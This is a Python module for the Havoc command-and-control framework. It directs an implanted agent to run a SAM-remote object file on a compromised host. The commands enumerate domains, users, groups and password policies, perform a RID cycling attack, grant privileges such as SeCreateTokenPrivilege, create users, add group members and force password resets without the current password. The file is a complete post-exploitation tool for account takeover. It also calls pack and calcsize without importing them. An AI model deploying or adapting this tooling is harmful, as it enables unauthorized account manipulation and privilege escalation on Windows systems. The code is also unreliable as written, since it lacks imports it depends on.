from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists


class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4


def list_domains(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 1:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server = args[0]

    # Add the arguments to the packer
    packer.addstr("list-domains")
    packer.addstr(server)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)

    return task_id


def add_account_right(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 4:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server = args[0]
    domain = args[1]
    username = args[2]
    right = args[3]

    # Add the arguments to the packer
    packer.addstr("add-account-right")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(username)
    packer.addstr(right)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)

    return task_id


def remove_account_right(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 4:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server = args[0]
    domain = args[1]
    username = args[2]
    right = args[3]

    # Add the arguments to the packer
    packer.addstr("remove-account-right")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(username)
    packer.addstr(right)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)

    return task_id


def list_account_rights(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server = args[0]
    domain = args[1]
    username = args[2]

    # Add the arguments to the packer
    packer.addstr("list-account-rights")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(username)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)

    return task_id


def rid_cycling(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 4:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]
    rid_min: int = int(args[2])
    rid_max: int = int(args[3])

    # Add the arguments to the packer
    packer.addstr("rid-cycling")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addint(rid_min)
    packer.addint(rid_max)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)

    return task_id


def enum_password_policy(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]

    # Add the arguments to the packer
    packer.addstr("enum-password-policy")
    packer.addstr(server)
    packer.addstr(domain)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)

    return task_id


def list_users(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]

    # Add the arguments to the packer
    packer.addstr("list-users")
    packer.addstr(server)
    packer.addstr(domain)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)
    return task_id


def list_groups(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]

    # Add the arguments to the packer
    packer.addstr("list-groups")
    packer.addstr(server)
    packer.addstr(domain)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)
    return task_id


def list_group_members(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]
    group: str = args[2]

    # Add the arguments to the packer
    packer.addstr("list-group-members")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(group)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)
    return task_id


def create_group(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]
    group: str = args[2]

    # Add the arguments to the packer
    packer.addstr("create-group")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(group)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)
    return task_id


def remove_group(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]
    group: str = args[2]

    # Add the arguments to the packer
    packer.addstr("remove-group")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(group)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)
    return task_id


def add_group_member(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 4:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]
    group: str = args[2]
    objectsid: str = args[3]

    # Add the arguments to the packer
    packer.addstr("add-group-member")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(group)
    packer.addstr(objectsid)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)
    return task_id


def remove_group_member(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 4:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]
    group: str = args[2]
    objectsid: str = args[3]

    # Add the arguments to the packer
    packer.addstr("remove-group-member")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(group)
    packer.addstr(objectsid)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)
    return task_id


def create_user(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 4:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]
    user: str = args[2]
    password: str = args[3]

    # Add the arguments to the packer
    packer.addstr("create-user")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(user)
    packer.addstr(password)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)
    return task_id


def remove_user(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 3:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]
    user: str = args[2]

    # Add the arguments to the packer
    packer.addstr("remove-user")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(user)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)
    return task_id


def change_password(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 5:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]
    user: str = args[2]
    password: str = args[3]
    new_password: str = args[4]

    # Add the arguments to the packer
    packer.addstr("change-password")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(user)
    packer.addstr(password)
    packer.addstr(new_password)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)
    return task_id


def force_change_password(demon_id, *args):
    packer: Packer = Packer()

    # Get the agent instance based on demon ID
    demon = Demon(demon_id)

    # Check if enough arguments have been specified
    if len(args) < 4:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
        return False

    # Get passed arguments
    server: str = args[0]
    domain: str = args[1]
    user: str = args[2]
    password: str = args[3]

    # Add the arguments to the packer
    packer.addstr("force-change-password")
    packer.addstr(server)
    packer.addstr(domain)
    packer.addstr(user)
    packer.addstr(password)

    task_id = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked the demon to execute the command")

    demon.InlineExecute(task_id, "go", "/tmp/sammy.x64.o", packer.getbuffer(), False)
    return task_id


RegisterModule("sammy", "interact with SAM & domain policy remote services", "", "[command] (args)", "", "")
RegisterCommand(list_domains, "sammy", "list-domains", "list the available domains of a MS-SAMR server", 0,
                "<server>", "localhost")

RegisterCommand(add_account_right, "sammy", "add-account-right",
                "add an account right to an object. Can be a logon right or privilege.", 0,
                "<server> <domain> <account> <right>", "localhost DESKTOP-XXXXX NioZow SeCreateTokenPrivilege")
RegisterCommand(add_group_member, "sammy", "add-group-member",
                "add a user to a group", 0, "<server> <domain> <group> <object sid>",
                "localhost DESKTOP-XXXXX Hackers S-1-5")

RegisterCommand(change_password, "sammy", "change-passwd",
                "change the password of a user", 0, "<server> <domain> <user> <current password> <new password>",
                "localhost DESKTOP-XXXXX niozow Password1! Password1234!")

RegisterCommand(create_group, "sammy", "create-group",
                "create a new group", 0, "<server> <domain> <group>", "localhost DESKTOP-XXXXX Hackers")

RegisterCommand(create_user, "sammy", "create-user",
                "create a new user", 0, "<server> <domain> <user> <password>",
                "localhost DESKTOP-XXXXX niozow Password1!")

RegisterCommand(enum_password_policy, "sammy", "enum-passwd-pol",
                "enum the password policy of a domain", 0, "<server> <domain>", "localhost DESKTOP-XXXXX")

RegisterCommand(force_change_password, "sammy", "force-change-passwd",
                "change the password of a user without knowing it.", 0, "<server> <domain> <user> <new password>",
                "localhost DESKTOP-XXXXX niozow Password1234!")

RegisterCommand(list_account_rights, "sammy", "list-account-rights",
                "enum account rights from an object. Can enum logon rights and privileges. Need admin privs.", 0,
                "<server> <domain> <account>", "localhost DESKTOP-XXXXX NioZow")

RegisterCommand(list_groups, "sammy", "list-groups",
                "enum the groups of a domain", 0, "<server> <domain>", "localhost DESKTOP-XXXXX")

RegisterCommand(list_group_members, "sammy", "list-group-members",
                "list the members of a group", 0, "<server> <domain> <group>", "localhost DESKTOP-XXXXX Administrators")

RegisterCommand(list_users, "sammy", "list-users",
                "enum the users of a domain", 0, "<server> <domain>", "localhost DESKTOP-XXXXX")

RegisterCommand(remove_account_right, "sammy", "rm-account-right",
                "remove an account right from an object. Can be a logon right or privilege.", 0,
                "<server> <domain> <account> <right>", "localhost DESKTOP-XXXXX NioZow SeInteractiveLogonRight")

RegisterCommand(remove_group, "sammy", "rm-group",
                "remove a group", 0, "<server> <domain> <group>", "localhost DESKTOP-XXXXX Hackers")

RegisterCommand(remove_group_member, "sammy", "rm-group-member",
                "remove a user from a group", 0, "<server> <domain> <group> <object sid>",
                "localhost DESKTOP-XXXXX Hackers S-1-5")

RegisterCommand(remove_user, "sammy", "rm-user",
                "remove a user", 0, "<server> <domain> <user>", "localhost DESKTOP-XXXXX niozow")

RegisterCommand(rid_cycling, "sammy", "rid-cycling",
                "perform a rid cycling attack. Does not need administrative privs on a remote system", 0,
                "<server> <domain> <rid-min> <rid-max>", "localhost DESKTOP-XXXXX 1000 1050")
